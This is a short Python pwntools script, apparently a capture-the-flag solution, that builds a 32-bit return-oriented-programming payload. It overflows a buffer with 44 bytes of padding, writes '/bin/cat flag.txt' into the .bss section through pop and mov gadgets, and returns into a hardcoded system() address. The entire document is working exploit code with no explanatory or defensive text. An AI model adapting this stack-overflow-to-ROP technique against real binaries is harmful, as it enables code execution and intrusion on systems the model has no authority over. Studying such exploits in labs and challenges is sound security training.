from pwn import *

pop_2 = p32(0x080486da) # pop edi; pop ebp; ret
mov = p32(0x08048670) # mov DWORD PTR [edi],ebp
bss_addr = 0x0804a040
system_addr = p32(0xf7e1a8b0)

payload = 'A'*44
#first write
payload += pop_2
payload += p32(bss_addr)
payload += p32(0x6e69622f) # "/bin"
payload += mov

#second write
payload += pop_2
payload += p32(bss_addr+0x4)
payload += p32(0x7461632f) # "/cat"
payload += mov

#third write
payload += pop_2
payload += p32(bss_addr+0x8)
payload += p32(0x616c6620) # " fla"
payload += mov

#fourth write
payload += pop_2
payload += p32(bss_addr+0xc)
payload += p32(0x78742e67) # "g.tx"
payload += mov

#last write
payload += pop_2
payload += p32(bss_addr+0x10)
payload += p32(0x00000074)
payload += mov

#return to system
payload += system_addr
payload += pop_2
payload += p32(bss_addr)

print payload

